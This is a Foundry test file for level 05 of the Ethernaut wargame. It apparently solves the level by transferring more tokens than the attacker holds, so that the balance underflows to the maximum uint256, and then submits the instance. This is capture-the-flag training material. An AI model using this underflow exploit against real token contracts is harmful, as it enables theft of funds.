// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/levels/05-Token/TokenFactory.sol";
import "../src/core/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        // Sets an address' balance, (who, newBalance)
        vm.deal(attacker, 1 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token tokenContract = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        tokenContract.transfer(address(0x1), 20);
        emit log_named_uint(
            "playerContract balance",
            tokenContract.balanceOf(address(attacker))
        );

        tokenContract.transfer(address(0x1), 1);
        emit log_named_uint(
            "playerContract balance",
            tokenContract.balanceOf(address(attacker))
        );

        // Check whether `balances[address(attacker)]` wrapped back to UINT256_MAX
        assertEq(tokenContract.balanceOf(address(attacker)), type(uint256).max);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
